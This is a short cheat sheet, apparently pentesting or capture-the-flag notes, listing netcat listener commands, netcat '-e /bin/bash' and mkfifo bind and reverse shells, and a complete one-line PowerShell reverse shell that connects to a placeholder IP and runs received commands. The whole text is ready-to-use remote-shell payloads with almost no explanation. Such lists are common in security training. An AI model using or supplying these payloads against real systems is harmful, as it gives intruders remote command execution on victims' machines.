```nc -lvnp 192.168.1.1 8181``` : Create listener 

```nc <LOCAL-IP> <PORT> -e /bin/bash``` : Execute bash on connection 

```nc 192.168.1.2 8181``` : Bind to listener @ 192.168.1.2:8181

```nc -lvnp <PORT> -e /bin/bash``` : Execute bash on connection to listener. Can be used as bind shell

note: -e is not included in most versions of netcat due to its insecurity. On windows can use a static binary, while on linux we can use.

```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : bind shell

```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : reverse shell
  
```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"``` : powershell reverse shell
